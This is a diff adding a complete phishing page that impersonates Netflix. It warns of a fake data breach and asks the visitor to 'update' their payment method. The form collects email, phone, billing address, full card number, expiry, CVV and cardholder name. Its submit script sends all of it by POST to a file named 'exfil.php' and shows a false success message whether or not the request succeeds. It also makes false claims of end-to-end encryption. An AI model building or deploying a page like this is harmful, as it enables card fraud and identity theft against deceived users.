@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix – Update Payment Method</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background: #fff;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 18px 40px;
+    border-bottom: 1px solid #e6e6e6;
+  }
+
+  .netflix-logo {
+    color: #E50914;
+    font-size: 30px;
+    font-weight: 900;
+    letter-spacing: -1px;
+    text-decoration: none;
+  }
+
+  .sign-out {
+    color: #333;
+    text-decoration: none;
+    font-size: 16px;
+  }
+
+  .sign-out:hover { text-decoration: underline; }
+
+  .main {
+    flex: 1;
+    max-width: 520px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 50px 24px 60px;
+  }
+
+  .security-alert {
+    background: #fff3cd;
+    border-left: 4px solid #ffc107;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+    border-radius: 4px;
+  }
+
+  .security-alert strong {
+    color: #856404;
+    display: block;
+    margin-bottom: 6px;
+    font-size: 15px;
+  }
+
+  .security-alert p {
+    color: #856404;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  .lock-icon {
+    width: 72px;
+    height: 72px;
+    border: 3px solid #E50914;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 28px;
+  }
+
+  .lock-icon svg {
+    width: 34px;
+    height: 34px;
+    fill: #E50914;
+  }
+
+  h1 {
+    font-size: 34px;
+    font-weight: 700;
+    color: #000;
+    margin-bottom: 20px;
+    line-height: 1.15;
+  }
+
+  .subtitle {
+    font-size: 18px;
+    color: #333;
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+
+  .encrypted-label {
+    text-align: right;
+    font-size: 14px;
+    color: #333;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+    gap: 6px;
+  }
+
+  .encrypted-label svg {
+    width: 14px;
+    height: 14px;
+    fill: #333;
+  }
+
+  .method-card {
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    padding: 20px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+
+  .method-card:hover {
+    border-color: #999;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+  }
+
+  .method-card-left h3 {
+    font-size: 18px;
+    font-weight: 400;
+    color: #000;
+    margin-bottom: 12px;
+  }
+
+  .card-brands {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+
+  .brand-box {
+    border: 1px solid #ddd;
+    border-radius: 3px;
+    padding: 4px 8px;
+    background: #fff;
+    height: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+  }
+
+  .brand-visa { color: #1a1f71; font-style: italic; font-size: 16px; }
+  .brand-mc { color: #eb001b; }
+  .brand-amex { color: #006fcf; font-size: 11px; }
+  .brand-discover { color: #ff6000; font-size: 11px; }
+
+  .chevron {
+    color: #333;
+    font-size: 24px;
+    font-weight: 300;
+  }
+
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    color: #0071eb;
+    text-decoration: none;
+    font-size: 16px;
+    margin-bottom: 24px;
+    cursor: pointer;
+  }
+
+  .back-link:hover { text-decoration: underline; }
+
+  .section-title {
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #000;
+  }
+
+  .form-section {
+    margin-bottom: 32px;
+  }
+
+  .form-group {
+    margin-bottom: 16px;
+  }
+
+  .form-group label {
+    display: block;
+    font-size: 14px;
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: #333;
+  }
+
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid #8c8c8c;
+    border-radius: 4px;
+    font-size: 16px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color 0.15s;
+    background: #fff;
+  }
+
+  .form-input:focus {
+    border-color: #0071eb;
+  }
+
+  .form-input::placeholder {
+    color: #757575;
+  }
+
+  .form-row {
+    display: flex;
+    gap: 12px;
+  }
+
+  .form-row .form-group {
+    flex: 1;
+  }
+
+  .input-with-icon {
+    position: relative;
+  }
+
+  .input-with-icon .form-input {
+    padding-right: 50px;
+  }
+
+  .input-icon {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #757575;
+    pointer-events: none;
+  }
+
+  .input-icon svg {
+    width: 24px;
+    height: 24px;
+    fill: #757575;
+  }
+
+  .help-circle {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    border: 1.5px solid #757575;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    color: #757575;
+    cursor: help;
+    background: #fff;
+  }
+
+  .brands-row {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+
+  .success-message {
+    background: #d4edda;
+    border: 1px solid #c3e6cb;
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin-bottom: 24px;
+    display: none;
+  }
+
+  .success-message.show {
+    display: block;
+  }
+
+  .success-message strong {
+    color: #155724;
+    display: block;
+    margin-bottom: 4px;
+  }
+
+  .success-message p {
+    color: #155724;
+    font-size: 14px;
+  }
+
+  .btn-update {
+    width: 100%;
+    padding: 16px;
+    background: #E50914;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.2s;
+  }
+
+  .btn-update:hover {
+    background: #f40612;
+  }
+
+  .btn-cancel {
+    width: 100%;
+    padding: 16px;
+    background: #fff;
+    color: #0071eb;
+    border: 1px solid #0071eb;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: background 0.2s;
+  }
+
+  .btn-cancel:hover {
+    background: #f5f5f5;
+  }
+
+  .footer {
+    background: #f3f3f3;
+    padding: 36px 40px 40px;
+    margin-top: auto;
+  }
+
+  .footer-content {
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  .footer-questions {
+    font-size: 16px;
+    color: #757575;
+    margin-bottom: 24px;
+  }
+
+  .footer-questions a {
+    color: #0071eb;
+    text-decoration: underline;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 40px;
+  }
+
+  .footer-links a {
+    color: #757575;
+    text-decoration: underline;
+    font-size: 14px;
+  }
+
+  .page { display: none; }
+  .page.active { display: block; }
+
+  @media (max-width: 600px) {
+    .header { padding: 16px 20px; }
+    .netflix-logo { font-size: 26px; }
+    .main { padding: 36px 20px 48px; }
+    h1 { font-size: 28px; }
+    .subtitle { font-size: 16px; }
+    .form-row { flex-direction: column; gap: 0; }
+    .footer { padding: 28px 20px 32px; }
+    .footer-links { gap: 24px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <a href="#" class="netflix-logo">NETFLIX</a>
+  <a href="/logout" class="sign-out">Sign Out</a>
+</header>
+
+<div class="page active" id="page1">
+  <div class="main">
+
+    <div class="security-alert">
+      <strong><i class="fa-solid fa-triangle-exclamation" style="color:#856404;margin-right:6px"></i>Security Notice</strong>
+      <p>Your payment method was removed due to a potential data breach. Please update your information to continue your membership.</p>
+    </div>
+
+    <div class="lock-icon">
+      <i class="fa-solid fa-lock" style="font-size:34px;color:#E50914"></i>
+    </div>
+
+    <h1>Update your payment method</h1>
+
+    <p class="subtitle">Your payment is encrypted and secure. We'll verify your information to protect your account.</p>
+
+    <div class="encrypted-label">
+      End-to-end encrypted
+      <i class="fa-solid fa-lock" style="font-size:14px"></i>
+    </div>
+
+    <div class="method-card" onclick="showPage(2)">
+      <div class="method-card-left">
+        <h3>Credit or Debit Card</h3>
+        <div class="card-brands">
+          <span class="brand-box brand-visa">VISA</span>
+          <span class="brand-box brand-mc"><i class="fa-solid fa-circle" style="font-size:8px;color:#eb001b"></i><i class="fa-solid fa-circle" style="font-size:8px;color:#eb001b;margin-left:2px"></i></span>
+          <span class="brand-box brand-amex">AMEX</span>
+          <span class="brand-box brand-discover">DISCOVER</span>
+        </div>
+      </div>
+      <span class="chevron"><i class="fa-solid fa-chevron-right"></i></span>
+    </div>
+
+  </div>
+</div>
+
+<div class="page" id="page2">
+  <div class="main">
+
+    <a class="back-link" onclick="showPage(1)"><i class="fa-solid fa-chevron-left"></i> Back</a>
+
+    <div class="success-message" id="successMsg">
+      <strong><i class="fa-solid fa-check-circle" style="color:#155724;margin-right:6px"></i>Payment method updated successfully!</strong>
+      <p>Redirecting you to your account...</p>
+    </div>
+
+    <h1>Update your card information</h1>
+
+    <form id="updateForm">
+
+      <div class="form-section">
+        <div class="section-title">Contact Information</div>
+
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" class="form-input" id="email" placeholder="your@email.com" required>
+        </div>
+
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="tel" class="form-input" id="phone" placeholder="+1 (555) 000-0000" required>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="section-title">Billing Address</div>
+
+        <div class="form-group">
+          <label for="street">Street Address</label>
+          <input type="text" class="form-input" id="street" placeholder="123 Main St" required>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="city">City</label>
+            <input type="text" class="form-input" id="city" placeholder="Los Angeles" required>
+          </div>
+          <div class="form-group">
+            <label for="state">State</label>
+            <select class="form-input" id="state" required>
+              <option value="">Select State</option>
+              <option value="AL">Alabama</option>
+              <option value="AK">Alaska</option>
+              <option value="AZ">Arizona</option>
+              <option value="CA">California</option>
+              <option value="CO">Colorado</option>
+              <option value="FL">Florida</option>
+              <option value="GA">Georgia</option>
+              <option value="IL">Illinois</option>
+              <option value="NY">New York</option>
+              <option value="TX">Texas</option>
+              <option value="WA">Washington</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="zip">ZIP Code</label>
+          <input type="text" class="form-input" id="zip" placeholder="90001" maxlength="10" required>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="section-title">Card Details</div>
+
+        <div class="brands-row">
+          <span class="brand-box brand-visa">VISA</span>
+          <span class="brand-box brand-mc"><i class="fa-solid fa-circle" style="font-size:8px;color:#eb001b"></i><i class="fa-solid fa-circle" style="font-size:8px;color:#eb001b;margin-left:2px"></i></span>
+          <span class="brand-box brand-amex">AMEX</span>
+          <span class="brand-box brand-discover">DISCOVER</span>
+        </div>
+
+        <div class="form-group">
+          <label for="cardNumber">Card Number</label>
+          <div class="input-with-icon">
+            <input type="text" class="form-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            <span class="input-icon">
+              <i class="fa-regular fa-credit-card"></i>
+            </span>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="expiry">Expiration Date</label>
+            <input type="text" class="form-input" id="expiry" placeholder="MM/YY" maxlength="5" required>
+          </div>
+          <div class="form-group">
+            <label for="cvv">CVV</label>
+            <div class="input-with-icon">
+              <input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4" required>
+              <span class="input-icon"><span class="help-circle" title="3 or 4 digit code on back of card"><i class="fa-solid fa-question" style="font-size:13px"></i></span></span>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="cardName">Name on Card</label>
+          <input type="text" class="form-input" id="cardName" placeholder="JOHN DOE" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-update">Update Payment Method</button>
+      <button type="button" class="btn-cancel" onclick="window.location.href='/account'">Cancel</button>
+
+    </form>
+
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-content">
+    <div class="footer-questions">Questions? <a href="#"><i class="fa-regular fa-envelope"></i> Contact us.</a></div>
+    <div class="footer-links">
+      <a href="#"><i class="fa-regular fa-circle-question"></i> FAQ</a>
+      <a href="#"><i class="fa-regular fa-life-ring"></i> Help Center</a>
+      <a href="#"><i class="fa-regular fa-user"></i> Account</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+  function showPage(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page' + n).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+  document.getElementById('cardNumber').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+  });
+  document.getElementById('expiry').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+    e.target.value = v;
+  });
+  document.getElementById('cvv').addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  });
+  document.getElementById('phone').addEventListener('input', function(e) {
+  e.target.value = e.target.value.replace(/[^\d+]/g, '');
+});
+  document.getElementById('zip').addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  });
+
+document.getElementById('updateForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const payload = {
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        billing_address: {
+            street: document.getElementById('street').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zip: document.getElementById('zip').value
+        },
+        card: {
+            number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+            expiry: document.getElementById('expiry').value,
+            cvv: document.getElementById('cvv').value,
+            name: document.getElementById('cardName').value
+        }
+    };
+
+    try {
+        const res = await fetch('exfil.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        
+        document.getElementById('successMsg').classList.add('show');
+        document.querySelectorAll('.form-input, .btn-update').forEach(el => el.disabled = true);
+        
+        setTimeout(() => {
+            window.location.href = result.redirect || '/account';
+        }, 2000);
+    } catch (err) {
+        document.getElementById('successMsg').classList.add('show');
+        setTimeout(() => window.location.href = '/account', 2000);
+    }
+});
+</script>
+
+</body>
+</html>
